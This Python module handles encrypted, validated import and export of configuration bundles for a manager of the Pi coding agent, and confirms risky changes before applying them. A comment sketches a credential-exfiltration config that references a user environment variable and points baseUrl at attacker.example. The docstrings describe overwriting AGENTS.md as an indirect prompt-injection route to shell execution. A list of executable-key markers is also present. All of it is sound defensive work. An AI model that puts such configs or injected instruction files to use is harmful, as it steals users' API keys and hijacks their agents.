# -*- coding: utf-8 -*-
"""配置包导出/导入（加密、校验、风险门闩）。

从 ``extras.py`` 下沉。``pi_manager.extras`` 继续 re-export，保持现有导入与
monkeypatch 点（``extras.xxx``）稳定。对会被测试 patch 的符号走 ``_extras().xxx``。
"""
from __future__ import annotations

import base64
import json
import os
import stat
import time
import zipfile
from contextlib import ExitStack
from datetime import datetime
from pathlib import Path, PurePosixPath
from typing import Any, Callable
from urllib.parse import urlsplit, urlunsplit

from . import core
from . import secrets as secretstore
from . import storage


def _extras():
    from . import extras

    return extras


_BUNDLE_AAD = b"PiManagerConfigSecrets:v1"
# 复用 secrets 的 KDF 迭代次数，保证 vault 与配置包加密强度一致。
_BUNDLE_KDF_ITERATIONS = secretstore.KDF_ITERATIONS
_MAX_ZIP_MEMBERS = 128
_MAX_ZIP_MEMBER_BYTES = 5 * 1024 * 1024
_MAX_ZIP_TOTAL_BYTES = 20 * 1024 * 1024


def _json_bytes(value: Any) -> bytes:
    return (json.dumps(value, ensure_ascii=False, indent=2) + "\n").encode("utf-8")


def _bundle_key(password: str, salt: bytes, iterations: int) -> bytes:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

    return PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
    ).derive(password.encode("utf-8"))


def _encrypt_bundle_secrets(secrets: dict[str, str], password: str) -> dict[str, Any]:
    if len(password) < 10:
        raise ValueError("密钥包密码至少需要 10 个字符")
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    salt, nonce = os.urandom(16), os.urandom(12)
    plaintext = _json_bytes({"secrets": secrets})
    ciphertext = AESGCM(_bundle_key(password, salt, _BUNDLE_KDF_ITERATIONS)).encrypt(
        nonce, plaintext, _BUNDLE_AAD
    )
    return {
        "version": 1,
        "cipher": "AES-256-GCM",
        "kdf": "PBKDF2-HMAC-SHA256",
        "iterations": _BUNDLE_KDF_ITERATIONS,
        "salt": base64.b64encode(salt).decode("ascii"),
        "nonce": base64.b64encode(nonce).decode("ascii"),
        "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
    }


def _decrypt_bundle_secrets(payload: dict[str, Any], password: str) -> dict[str, str]:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    if payload.get("version") != 1 or payload.get("cipher") != "AES-256-GCM":
        raise ValueError("不支持的密钥包加密格式")
    try:
        iterations = int(payload["iterations"])
        if not 100_000 <= iterations <= 2_000_000:
            raise ValueError("invalid KDF iterations")
        salt = base64.b64decode(str(payload["salt"]), validate=True)
        nonce = base64.b64decode(str(payload["nonce"]), validate=True)
        ciphertext = base64.b64decode(str(payload["ciphertext"]), validate=True)
        plaintext = AESGCM(_bundle_key(password, salt, iterations)).decrypt(
            nonce, ciphertext, _BUNDLE_AAD
        )
        decoded = json.loads(plaintext.decode("utf-8"))
        secrets = decoded.get("secrets") if isinstance(decoded, dict) else None
        if not isinstance(secrets, dict):
            raise ValueError("invalid secrets payload")
        return {str(name): str(value) for name, value in secrets.items()}
    except Exception as exc:
        raise ValueError("密钥包密码错误或文件已被篡改") from exc


def _export_safe_models() -> dict[str, Any]:
    models = json.loads(json.dumps(core.load_models_config()))
    for entry in (models.get("providers") or {}).values():
        if not isinstance(entry, dict):
            continue
        headers = entry.get("headers")
        if not isinstance(headers, dict):
            continue
        for key, value in list(headers.items()):
            field = str(key).lower()
            raw = str(value or "")
            is_reference = raw.startswith(("$", "!"))
            if any(x in field for x in ("authorization", "api-key", "apikey", "token", "secret", "cookie")) and not is_reference:
                headers[key] = ""
    return models


def _strip_plaintext_api_keys(models: dict[str, Any]) -> list[str]:
    """把 providers 中仍为明文的 apiKey 引用化（存入安全存储）。

    迁移失败（vault/keyring 不可用）时置空该字段并返回警告，保证未加密
    导出包永远不携带明文 apiKey。已是环境变量引用或命令引用（`!` 前缀）
    的值原样保留，不触发任何存储写入。返回值为 export-meta.json 的
    warnings 列表内容。
    """
    warnings: list[str] = []
    providers = models.get("providers")
    if not isinstance(providers, dict):
        return warnings
    for name, entry in providers.items():
        if not isinstance(entry, dict):
            continue
        raw = entry.get("apiKey")
        key = str(raw or "").strip() if raw is not None else ""
        if not key or key.startswith("!"):
            continue
        env_name = secretstore.referenced_env_name(key)
        if env_name:
            entry["apiKey"] = f"${{{env_name}}}"
            continue
        try:
            entry["apiKey"] = secretstore.store_provider_api_key(str(name), key)
        except Exception:
            # 密钥存储不可用：置空并警告，绝不把明文写进导出包。
            entry["apiKey"] = ""
            warnings.append(
                f"provider {name} 的 apiKey 无法安全引用化（密钥存储不可用），"
                "已从导出中移除"
            )
    return warnings


# settings.json 是官方 Pi 自己的配置文件，PiManager 只读写 defaultProvider /
# defaultModel / defaultThinkingLevel / enabledModels / theme 这类展示型键，但
# 配置包导入历史上对它零校验（只断言「顶层是 dict」）：任何具备可执行语义的键
# （hook / mcpServers / command / apiKeyHelper / env）都会被无校验落盘，用户下次
# 运行 Pi（一个有 shell 权限的编码 agent）即代码执行（R2 审计 P1-4）。
# 这里刻意不做「白名单保留、其余丢弃」——那会静默吃掉用户自己的 Pi 设置，让
# 导出→导入变成有损操作。改为：导出侧剥离这些键（自己导的包仍可原样导回），
# 导入侧命中即整包拒绝并指出键名。
_EXECUTABLE_SETTINGS_MARKERS = (
    "hook",
    "mcpserver",
    "command",
    "shell",
    "exec",
    "helper",
    "interpreter",
)
_EXECUTABLE_SETTINGS_KEYS = ("env", "permissions")


def _executable_settings_keys(settings: dict[str, Any]) -> list[str]:
    """返回 settings.json 中具备可执行 / 授权语义的键名。"""
    hits: list[str] = []
    for key in settings:
        normalized = "".join(ch for ch in str(key).lower() if ch.isalnum())
        if normalized in _EXECUTABLE_SETTINGS_KEYS or any(
            marker in normalized for marker in _EXECUTABLE_SETTINGS_MARKERS
        ):
            hits.append(str(key))
    return sorted(hits)


def _export_safe_settings() -> tuple[dict[str, Any], list[str]]:
    """导出用的 settings.json 副本：剥离可执行语义键，返回 (副本, 警告)。"""
    settings = json.loads(json.dumps(core.load_settings()))
    if not isinstance(settings, dict):
        return {}, []
    dropped = _executable_settings_keys(settings)
    for key in dropped:
        settings.pop(key, None)
    warnings = [
        f"settings.json 的 {key} 键具备可执行语义，已从导出中移除（导入侧一律拒绝）"
        for key in dropped
    ]
    return settings, warnings


def _known_secret_values() -> list[str]:
    """安全存储里当前全部密钥值（用于未加密导出的最后一道闸）。"""
    values: list[str] = []
    for name in secretstore.list_secret_names():
        try:
            value = secretstore.get_secret(name)
        except Exception:
            continue
        # 过短的值参与比对会造成误伤（与 core.redact_secret_values 同口径）。
        if value and len(value) >= 8:
            values.append(value)
    return values


def _assert_no_known_secret_in_entries(entries: dict[str, bytes]) -> None:
    """最后一道闸：导出包的明文成员里不得出现任何已知密钥值。

    承诺 P5（未加密导出不含任何密钥）此前完全依赖 `referenced_env_name` 的判断，
    一旦该判断出错（P1-2 就是实例）明文就直接进了 ZIP。这里在写盘前用安全存储
    里的真实值做一次精确比对，命中即拒绝导出（fail closed），不打印密钥本身。
    """
    values = _known_secret_values()
    if not values:
        return
    for name, content in entries.items():
        if name == "secrets.enc.json":
            continue  # 已是 AES-GCM 密文
        for value in values:
            if value.encode("utf-8") in content:
                raise ValueError(
                    f"导出被中止：{name} 中检测到安全存储里的密钥明文。"
                    "请先在 Provider 编辑页把该字段改为环境变量引用，再重新导出"
                )


def _export_safe_manager() -> dict[str, Any]:
    manager = json.loads(json.dumps(core.load_manager_config()))
    proxy = str(manager.get("proxy_url") or "")
    try:
        parsed = urlsplit(proxy)
        if parsed.username is not None or parsed.password is not None:
            host = parsed.hostname or ""
            if parsed.port:
                host += f":{parsed.port}"
            manager["proxy_url"] = urlunsplit(
                (parsed.scheme, host, parsed.path, parsed.query, parsed.fragment)
            )
    except ValueError:
        manager["proxy_url"] = ""
    return manager


def export_config_bundle(
    dest_path: str,
    *,
    include_secrets: bool = False,
    password: str = "",
) -> str:
    """Export a validated config ZIP; secret values are always authenticated-encrypted."""
    dest = Path(dest_path)
    if dest.suffix.lower() != ".zip":
        dest = dest.with_suffix(".zip")
    core.ensure_agent_dir()
    safe_models = _export_safe_models()
    export_warnings = _strip_plaintext_api_keys(safe_models)
    safe_settings, settings_warnings = _export_safe_settings()
    export_warnings.extend(settings_warnings)
    entries: dict[str, bytes] = {
        "settings.json": _json_bytes(safe_settings),
        "models.json": _json_bytes(safe_models),
        "pi-manager.json": _json_bytes(_export_safe_manager()),
    }
    agents = core.agents_md_path()
    if agents.exists() and agents.is_file():
        entries["AGENTS.md"] = agents.read_bytes()
    themes = core.pi_agent_dir() / "themes"
    if themes.exists():
        for theme in themes.glob("*.json"):
            if theme.is_file() and theme.stat().st_size <= _MAX_ZIP_MEMBER_BYTES:
                entries[f"themes/{theme.name}"] = theme.read_bytes()

    meta = {
        "app": _extras().APP_NAME,
        "version": _extras().APP_VERSION,
        "exported_at": datetime.now().isoformat(timespec="seconds"),
        "include_secrets": include_secrets,
        "secrets_encrypted": include_secrets,
    }
    if export_warnings:
        # 新增可选字段：明文 apiKey 被移除时的警告列表（导入侧不读取，
        # 向后兼容）。
        meta["warnings"] = export_warnings
    entries["export-meta.json"] = _json_bytes(meta)
    if include_secrets:
        values = {}
        for name in secretstore.list_secret_names():
            value = secretstore.get_secret(name)
            if value:
                values[name] = value
        entries["secrets.enc.json"] = _json_bytes(
            _encrypt_bundle_secrets(values, password)
        )

    _assert_no_known_secret_in_entries(entries)
    dest.parent.mkdir(parents=True, exist_ok=True)
    temp = dest.with_name(f".{dest.name}.{os.getpid()}.{time.time_ns()}.tmp")
    try:
        with zipfile.ZipFile(temp, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for name, content in entries.items():
                zf.writestr(name, content)
        os.replace(temp, dest)
    finally:
        temp.unlink(missing_ok=True)
    # 导出包可能含配置快照，POSIX 下收紧为仅当前用户可读写。
    try:
        os.chmod(dest, 0o600)
    except OSError:
        pass
    return str(dest)


def _read_bundle(src: Path) -> dict[str, bytes]:
    allowed_roots = {
        "settings.json",
        "models.json",
        "pi-manager.json",
        "AGENTS.md",
        "export-meta.json",
        "secrets.enc.json",
    }
    files: dict[str, bytes] = {}
    with zipfile.ZipFile(src, "r") as zf:
        infos = zf.infolist()
        if len(infos) > _MAX_ZIP_MEMBERS:
            raise ValueError("ZIP 文件成员过多")
        total = 0
        for info in infos:
            name = info.filename.replace("\\", "/")
            path = PurePosixPath(name)
            if info.is_dir():
                continue
            if path.is_absolute() or ".." in path.parts or not path.parts:
                raise ValueError(f"ZIP 包含非法路径: {info.filename}")
            allowed = name in allowed_roots or (
                len(path.parts) == 2
                and path.parts[0] == "themes"
                and path.suffix.lower() == ".json"
            )
            if not allowed:
                raise ValueError(f"ZIP 包含不允许的文件: {info.filename}")
            if info.file_size > _MAX_ZIP_MEMBER_BYTES:
                raise ValueError(f"ZIP 成员过大: {info.filename}")
            total += info.file_size
            if total > _MAX_ZIP_TOTAL_BYTES:
                raise ValueError("ZIP 解压后总大小超过限制")
            if name in files:
                raise ValueError(f"ZIP 包含重复文件: {name}")
            content = zf.read(info)
            if len(content) != info.file_size:
                raise ValueError(f"ZIP 成员长度异常: {name}")
            files[name] = content
    return files


def bundle_contains_secrets(zip_path: str) -> bool:
    src = Path(zip_path)
    if not src.exists():
        return False
    try:
        return "secrets.enc.json" in _read_bundle(src)
    except Exception:
        return False


def _parse_bundle_json(files: dict[str, bytes], name: str) -> dict[str, Any] | None:
    if name not in files:
        return None
    try:
        value = json.loads(files[name].decode("utf-8-sig"))
    except Exception as exc:
        raise ValueError(f"{name} 不是有效 UTF-8 JSON") from exc
    if not isinstance(value, dict):
        raise ValueError(f"{name} 顶层必须是 JSON 对象")
    return value


def _atomic_replace_bytes(path: Path, content: bytes, *, private: bool = False) -> None:
    """以任意 bytes 内容原子替换文件。

    刻意独立于 ``storage._write_unlocked``：storage 面向 JSON——写前会读取
    校验、拒绝覆盖损坏 JSON、并做 ``.bak.1``/``.bak.2`` 备份轮转。本函数写任意
    bytes（导入/恢复配置包时可能是 JSON、也可能是 ``AGENTS.md`` 等纯文本），
    且调用方（``import_config_bundle`` 及回滚路径）已自行管理备份快照，因此不
    做 JSON 解析与备份轮转，以免引入多余耦合或改变现有行为。原子写机制与
    ``storage._write_unlocked`` 的原子写部分一致：``O_EXCL`` 创建临时文件、
    ``0o600`` 初值、保留已有文件的 ``previous_mode``、``flush`` + ``fsync`` +
    ``os.replace``。
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    previous_mode: int | None = None
    if not private:
        try:
            previous_mode = stat.S_IMODE(path.stat().st_mode)
        except OSError:
            previous_mode = None
    temp = path.with_name(f".{path.name}.{os.getpid()}.{time.time_ns()}.tmp")
    try:
        # 与 storage.py 的语义一致：新文件一律 0600 初值；已有文件保留
        # previous_mode，绝不因一次重写而放宽权限。
        fd = os.open(temp, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        handle = os.fdopen(fd, "wb")
        with handle:
            handle.write(content)
            handle.flush()
            os.fsync(handle.fileno())
        if previous_mode is not None:
            try:
                os.chmod(temp, previous_mode)
            except OSError:
                pass
        os.replace(temp, path)
        if private:
            try:
                os.chmod(path, 0o600)
            except OSError:
                pass
    finally:
        temp.unlink(missing_ok=True)


def _is_private_or_link_local_host(host: str) -> bool:
    import ipaddress

    host = (host or "").strip().lower().rstrip(".")
    if not host:
        return True
    if host == "localhost" or host.endswith((".localhost", ".local")):
        return True
    if host.startswith("::ffff:"):
        host = host[7:]
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    # 复用 core 的 IP 分类（private/loopback/link_local/reserved/multicast），
    # 额外补充 core 未覆盖的 is_unspecified（0.0.0.0 / ::）。
    return core._is_private_host(host) or ip.is_unspecified


def _validate_model_base_url(url: str) -> str:
    """Return an error message for an imported provider baseUrl, or "" when OK."""
    try:
        parsed = urlsplit(url)
    except ValueError:
        return "URL 格式不合法"
    if parsed.scheme not in ("http", "https"):
        return "仅支持 http/https 协议"
    if not parsed.hostname:
        return "缺少有效主机名"
    if _is_private_or_link_local_host(str(parsed.hostname)):
        return "不允许指向本地或内网地址"
    return ""


def _is_dpapi_marker(value: Any) -> bool:
    """True 当值是 `__DPAPI__:<provider>` 历史标记（含引号 / 空白包装）。"""
    return core.normalize_config_string(value).startswith("__DPAPI__:")


def _validate_settings(settings: dict[str, Any]) -> None:
    """拒绝携带可执行 / 授权语义键的 settings.json（R2 审计 P1-4）。"""
    hits = _executable_settings_keys(settings)
    if hits:
        raise ValueError(
            "settings.json 含具备可执行或授权语义的键，配置包一律拒绝："
            + "、".join(hits)
            + "。请手动核对后在本机 settings.json 中自行配置"
        )


def _validate_models(models: dict[str, Any]) -> None:
    providers = models.get("providers", {})
    if not isinstance(providers, dict):
        raise ValueError("models.json.providers 必须是对象")
    for name, entry in providers.items():
        if not isinstance(name, str) or not isinstance(entry, dict):
            raise ValueError("models.json Provider 条目无效")
        if "models" in entry and not isinstance(entry["models"], list):
            raise ValueError(f"Provider {name} 的 models 必须是数组")
        if "apiKey" in entry and not isinstance(entry["apiKey"], str):
            raise ValueError(f"Provider {name} 的 apiKey 必须是字符串")
        if core.is_executable_config_value(entry.get("apiKey")):
            raise ValueError(f"Provider {name} 包含已禁用的 !command 凭据")
        if _is_dpapi_marker(entry.get("apiKey")):
            raise ValueError(
                f"Provider {name} 的 apiKey 使用了 __DPAPI__: 历史标记："
                "该标记声明「我的 Key 存在另一个 Provider 名下」，导入时会把你已有"
                "Provider 的真实密钥复制给这个新 Provider（并随后发往它的 baseUrl），"
                "因此配置包一律不接受"
            )
        base_url = str(entry.get("baseUrl") or "")
        if base_url:
            base_error = _validate_model_base_url(base_url)
            if base_error:
                raise ValueError(
                    f"Provider {name} 的 baseUrl 无效：{base_error}；"
                    "如需本地模型服务，请直接在设置中手动添加该模型地址"
                )
        headers = entry.get("headers", {})
        if headers and not isinstance(headers, dict):
            raise ValueError(f"Provider {name} 的 headers 必须是对象")
        if isinstance(headers, dict):
            for header_name, value in headers.items():
                if not isinstance(header_name, str) or not isinstance(value, str):
                    raise ValueError(f"Provider {name} 的 Header 必须是字符串键值")
                if core.is_executable_config_value(value):
                    raise ValueError(
                        f"Provider {name} 的 Header {header_name} 包含已禁用的 !command 凭据"
                    )
                if _is_dpapi_marker(value):
                    raise ValueError(
                        f"Provider {name} 的 Header {header_name} 使用了"
                        " __DPAPI__: 历史标记，配置包一律不接受"
                    )


def _secret_snapshot() -> dict[str, str]:
    return {
        name: secretstore.get_secret(name)
        for name in secretstore.list_secret_names()
    }


def _restore_secret_snapshot(snapshot: dict[str, str]) -> None:
    for name in set(secretstore.list_secret_names()) - set(snapshot):
        secretstore.delete_secret(name)
    for name, value in snapshot.items():
        secretstore.set_secret(name, value)


# ---- R1：导入前的高风险变更清单（写盘前逐条确认） ----
#
# `${NAME}` 是官方 Pi 支持的合法 apiKey / Header 写法，`_validate_models` 不能像
# 对待 `__DPAPI__:` 那样一律拒绝——那会打死所有正常使用环境变量的用户。但
# `secrets.resolve_provider_api_key` 与 `secrets.resolve_provider_header_value` 对
# 「引用名 != 本 Provider 自管名」的情况会直接 `os.environ.get(env_name)`，于是一个
# 配置包只要写
#     apiKey: "${OPENAI_API_KEY}"  +  baseUrl: "https://attacker.example/v1"
# 导入后应用就会把**用户环境里的真实 Key** 以 Bearer 发往攻击者。这与已修的
# `__DPAPI__:` 跨 Provider 窃取（P0-2）同属一类「让导入的配置引用本机已有凭据 +
# 把流量指向别处」，但无法靠拒绝某个标记解决，只能在写盘前把差异摆给用户逐条确认。
RISK_NEW_PROVIDER = "new_provider"
RISK_BASE_URL_CHANGE = "base_url_change"
RISK_API_KEY_ENV_REF = "api_key_env_ref"
RISK_HEADER_ENV_REF = "header_env_ref"

_NO_BASE_URL_HINT = "（未指定，沿用 Pi 默认端点）"
_RISK_UNCONFIRMED_ERROR = (
    "配置包含需要逐条确认的高风险变更（新增 Provider / Base URL 变更 / 凭据引用"
    "本机环境变量），但调用方没有提供确认入口，已整包拒绝，本机配置未做任何修改"
)
_RISK_DECLINED_ERROR = "已取消导入：高风险变更未获确认，本机配置未做任何修改"


def _external_env_reference(value: Any, managed_env: str) -> str:
    """返回该字段引用的「非本 Provider 自管」环境变量名，否则空串。

    自管引用（`PI_MANAGER_PROVIDER_<SLUG>_<HASH>_API_KEY` 与 Header 的对应名）指向
    本应用安全存储里该 Provider 自己的条目，是「导出→导入」往返的正常形态，不算
    风险；其余任何 `$NAME` / `${NAME}` 在请求时都会从**用户进程环境**取值，正是本
    节要拦的对象——包括「引用另一个 Provider 的自管名」这种变形。

    裸大写变量名不在此列：外部输入面已在 P1-2 关闭（`migrate_plaintext_keys(
    trusted=False)`），导入时它会被当成字面密钥保管，不会解析环境变量。
    """
    name = secretstore.referenced_env_name(core.normalize_config_string(value))
    if not name or name == managed_env:
        return ""
    return name


def _providers_on_disk() -> dict[str, Any]:
    """本机 models.json 当前的 providers；刻意不触发任何迁移 / 清理副作用。

    不用 `core.load_models_config()`：它会顺带把明文 Key 迁进安全存储并重写文件。
    差异计算发生在「要不要写盘」的判断阶段，本身不应该产生任何写入；而且这里要的
    正是**磁盘上的原样现状**（明文 apiKey 就该被看作「无环境变量引用」）。
    """
    data = core.load_json(core.models_path(), {})
    providers = data.get("providers") if isinstance(data, dict) else None
    return providers if isinstance(providers, dict) else {}


def _env_state_hint(env_name: str) -> tuple[bool, str]:
    """该环境变量此刻是否真有值——决定这条风险是「理论上的」还是「立刻生效的」。"""
    present = bool(os.environ.get(env_name, "").strip())
    return present, "当前已设置" if present else "当前未设置"


def _api_key_env_risk(
    name: str, entry: dict[str, Any], existing: dict[str, Any] | None, base_url: str
) -> dict[str, Any] | None:
    managed = secretstore.provider_env_name(name)
    env_name = _external_env_reference(entry.get("apiKey"), managed)
    if not env_name:
        return None
    if existing is not None and env_name == _external_env_reference(
        existing.get("apiKey"), managed
    ):
        return None  # 本机已经是同一个引用，导入没有改变凭据来源
    present, hint = _env_state_hint(env_name)
    return {
        "kind": RISK_API_KEY_ENV_REF,
        "provider": name,
        "base_url": base_url,
        "env_name": env_name,
        "env_present": present,
        "detail": (
            f"Provider「{name}」的 API Key 将引用本机环境变量 ${{{env_name}}}"
            f"（{hint}）；请求时该变量的真实值会被发往 {base_url}"
        ),
    }


def _header_env_risks(
    name: str, entry: dict[str, Any], existing: dict[str, Any] | None, base_url: str
) -> list[dict[str, Any]]:
    """Header 里的外部环境变量引用，与 apiKey 完全同源的一条泄漏通路。

    刻意**不**按 `is_sensitive_header_name` 过滤：`core_remote` 的两处发送路径
    （`:198`、`:655`）对**所有** Header 都调 `resolve_provider_header_value`，所以
    `X-Whatever: ${OPENAI_API_KEY}` 一样会把真实值发出去。
    """
    headers = entry.get("headers")
    if not isinstance(headers, dict):
        return []
    current = (existing or {}).get("headers")
    current = current if isinstance(current, dict) else {}
    risks: list[dict[str, Any]] = []
    for header, value in headers.items():
        if not isinstance(header, str):
            continue
        managed = secretstore.provider_header_env_name(name, header)
        env_name = _external_env_reference(value, managed)
        if not env_name:
            continue
        if existing is not None and env_name == _external_env_reference(
            current.get(header), managed
        ):
            continue
        present, hint = _env_state_hint(env_name)
        risks.append(
            {
                "kind": RISK_HEADER_ENV_REF,
                "provider": name,
                "base_url": base_url,
                "header": header,
                "env_name": env_name,
                "env_present": present,
                "detail": (
                    f"Provider「{name}」的 Header {header} 将引用本机环境变量 "
                    f"${{{env_name}}}（{hint}）；请求时该变量的真实值会被发往 "
                    f"{base_url}"
                ),
            }
        )
    return risks


def collect_import_risks(providers: Any) -> list[dict[str, Any]]:
    """算出配置包 providers 相对本机现状的高风险变更清单（写盘前用于逐条确认）。

    每一项形如 `{"kind", "provider", "base_url", "detail", ...}`，`detail` 是可直接
    展示给用户的中文单行说明。只报真正会让「本机凭据流向新地址」的四类变更：

    * `new_provider`：本机没有的 Provider —— 它的 baseUrl 与凭据来源全是新的；
    * `base_url_change`：已有 Provider 改指新地址 —— 原有 Key 会发往新地址；
    * `api_key_env_ref`：apiKey 新引用一个外部环境变量；
    * `header_env_ref`：某个 Header 新引用一个外部环境变量。

    其余变更（模型列表、显示型字段、Provider 删除、baseUrl 被清空回默认端点）一律
    不报。这条边界是刻意的：如果连纯粹的模型列表更新都弹确认，用户很快就会学会
    无脑点「确定」，那和没有确认没有区别。
    """
    if not isinstance(providers, dict):
        return []
    current = _providers_on_disk()
    risks: list[dict[str, Any]] = []
    for name, entry in providers.items():
        if not isinstance(name, str) or not isinstance(entry, dict):
            continue
        existing = current.get(name)
        existing = existing if isinstance(existing, dict) else None
        incoming_base = core.normalize_config_string(entry.get("baseUrl"))
        current_base = core.normalize_config_string((existing or {}).get("baseUrl"))
        base_url = incoming_base or current_base or _NO_BASE_URL_HINT
        if existing is None:
            risks.append(
                {
                    "kind": RISK_NEW_PROVIDER,
                    "provider": name,
                    "base_url": base_url,
                    "detail": f"新增 Provider「{name}」，请求将发往 {base_url}",
                }
            )
        elif incoming_base and incoming_base != current_base:
            risks.append(
                {
                    "kind": RISK_BASE_URL_CHANGE,
                    "provider": name,
                    "base_url": incoming_base,
                    "old_base_url": current_base or _NO_BASE_URL_HINT,
                    "detail": (
                        f"Provider「{name}」的 Base URL 变更："
                        f"{current_base or _NO_BASE_URL_HINT} → {incoming_base}；"
                        "该 Provider 现有的 API Key 将改为发往新地址"
                    ),
                }
            )
        api_risk = _api_key_env_risk(name, entry, existing, base_url)
        if api_risk is not None:
            risks.append(api_risk)
        risks.extend(_header_env_risks(name, entry, existing, base_url))
    return risks


def _gate_import_risks(
    models: dict[str, Any] | None,
    confirm_risks: Callable[[list[dict[str, Any]]], bool] | None,
) -> tuple[list[dict[str, Any]], dict[str, Any] | None]:
    """返回 (风险清单, 拒绝结果)。拒绝结果非 None 时调用方必须原样返回它。

    fail closed：没有确认入口就等于没人确认，整包拒绝。宁可让一个新调用方立刻
    报错（可见、可修），也不要让它静默继承一条凭据外流通路。
    """
    risks = collect_import_risks(
        models.get("providers") if isinstance(models, dict) else None
    )
    if not risks:
        return risks, None
    if confirm_risks is None:
        return risks, {
            "ok": False,
            "needs_confirmation": True,
            "risks": risks,
            "error": _RISK_UNCONFIRMED_ERROR,
        }
    # 传副本：回调（UI）不该能改写我们即将据以提交的清单。
    if not confirm_risks([dict(item) for item in risks]):
        return risks, {
            "ok": False,
            "cancelled": True,
            "risks": risks,
            "error": _RISK_DECLINED_ERROR,
        }
    return risks, None


def import_config_bundle(
    zip_path: str,
    *,
    restore_secrets: bool = False,
    password: str = "",
    allow_commands: bool = False,
    import_agents_md: bool = False,
    confirm_risks: Callable[[list[dict[str, Any]]], bool] | None = None,
) -> dict[str, Any]:
    """Validate an entire bundle before applying it, then commit transactionally.

    ``confirm_risks`` 是 R1 的确认入口：全量校验通过、**尚未写任何东西**时，本函数
    算出「将新增 / 变更的 Provider + 其 baseUrl + 凭据引用形式」的高风险清单
    （见 :func:`collect_import_risks`），非空则回调它；回调返回假值即整包不写
    （沿用既有事务语义：磁盘与安全存储都保持原状）。清单为空时**不回调**——无害的
    导入（纯模型列表更新、原样导回自己导的包）不打扰用户。

    没有传 ``confirm_risks`` 而清单非空时一律拒绝（fail closed），并在结果里带
    ``needs_confirmation`` 与 ``risks``，让调用方知道该接确认入口。

    ``import_agents_md`` 默认 False：`AGENTS.md` 是全局 agent 指令文件，覆盖它
    等于让下一次运行的 Pi（有 shell 权限、`run_pi_print` 还会自动加 `--approve`）
    遵循配置包作者的指令，是一条间接提示注入 → 代码执行的通路（R2 审计 P1-4）。
    调用方必须在向用户展示全文 diff 并取得确认后才显式传 True。
    """
    src = Path(zip_path)
    if not src.exists() or not src.is_file():
        return {"ok": False, "error": "文件不存在"}
    try:
        files = _read_bundle(src)
        settings = _parse_bundle_json(files, "settings.json")
        models = _parse_bundle_json(files, "models.json")
        manager = _parse_bundle_json(files, "pi-manager.json")
        if settings is not None:
            _validate_settings(settings)
        if models is not None:
            _validate_models(models)
        if manager is not None:
            proxy_error = _extras()._validate_proxy_url(str(manager.get("proxy_url") or ""))
            if proxy_error:
                raise ValueError(f"pi-manager.json 的代理地址无效：{proxy_error}")
        theme_data: dict[str, dict[str, Any]] = {}
        for name in files:
            if name.startswith("themes/"):
                parsed = _parse_bundle_json(files, name)
                if parsed is not None:
                    theme_data[name] = parsed
        imported_secrets: dict[str, str] = {}
        if restore_secrets and "secrets.enc.json" in files:
            encrypted = _parse_bundle_json(files, "secrets.enc.json") or {}
            imported_secrets = _decrypt_bundle_secrets(encrypted, password)
        elif restore_secrets and "secrets.enc.json" not in files:
            raise ValueError("配置包不包含加密密钥")

        # 全量校验已通过、此刻还没有写任何东西：在这里算差异并请求确认。
        # 位置刻意选在提交之前、且与提交共用同一份已解析的 ``models`` —— 若改成
        # 「先预览一次、用户确认后再重新打开 ZIP 提交」，攻击者可以在两次读取之间
        # 换掉文件（TOCTOU），用户确认的就不是最终落盘的内容。
        risks, refusal = _gate_import_risks(models, confirm_risks)
        if refusal is not None:
            return refusal

        core.ensure_agent_dir()
        writes: dict[Path, bytes] = {}
        if settings is not None:
            writes[core.settings_path()] = _json_bytes(settings)
        if models is not None:
            writes[core.models_path()] = _json_bytes(models)
        if manager is not None:
            writes[core.manager_config_path()] = _json_bytes(manager)
        skipped: list[str] = []
        if "AGENTS.md" in files:
            files["AGENTS.md"].decode("utf-8")
            if import_agents_md:
                writes[core.agents_md_path()] = files["AGENTS.md"]
            else:
                skipped.append("AGENTS.md")
        for name, parsed in theme_data.items():
            writes[core.pi_agent_dir() / name] = _json_bytes(parsed)

        restored: list[str] = []
        with ExitStack() as file_locks:
            for path in sorted(writes, key=lambda item: str(item.resolve())):
                file_locks.enter_context(storage.locked(path))
            backups = {
                path: path.read_bytes() if path.exists() else None
                for path in writes
            }
            secret_backup = _secret_snapshot()
            try:
                for name, value in imported_secrets.items():
                    secretstore.set_secret(name, value)
                if models is not None:
                    # trusted=False：这些 provider 条目直接来自外部配置包，
                    # 不得触发 __DPAPI__ 跨 provider 凭据复制（P0-2），也不做
                    # 裸大写变量名的兼容解析（P1-2 的外部输入面）。
                    models["providers"] = secretstore.migrate_plaintext_keys(
                        models.get("providers") or {}, trusted=False
                    )
                    writes[core.models_path()] = _json_bytes(models)
                for path, content in writes.items():
                    _atomic_replace_bytes(
                        path,
                        content,
                        private=(path == core.manager_config_path()),
                    )
                restored = [
                    name
                    for name in ("settings.json", "models.json", "pi-manager.json")
                    if name in files
                ]
                if "AGENTS.md" in files and import_agents_md:
                    restored.append("AGENTS.md")
                if theme_data:
                    restored.append("themes/")
                if imported_secrets:
                    restored.append("secrets")
            except Exception:
                for path, original in backups.items():
                    if original is None:
                        path.unlink(missing_ok=True)
                    else:
                        _atomic_replace_bytes(path, original)
                _restore_secret_snapshot(secret_backup)
                raise
        # 导入刚刚重写了 models.json：如果历史备份里还留着迁移前的明文密钥，
        # 一并擦除（P1-3）。
        purged = _extras().purge_plaintext_key_backups()
        result: dict[str, Any] = {"ok": True, "restored": restored}
        if risks:
            # 已确认并落盘的高风险项：调用方可据此在成功提示里复述一遍，用户过后
            # 也还能看到自己刚刚同意了什么。
            result["risks"] = risks
        if skipped:
            result["skipped"] = skipped
        if purged:
            result["purged_backups"] = purged
        return result
    except Exception as exc:
        return {"ok": False, "error": str(exc)}
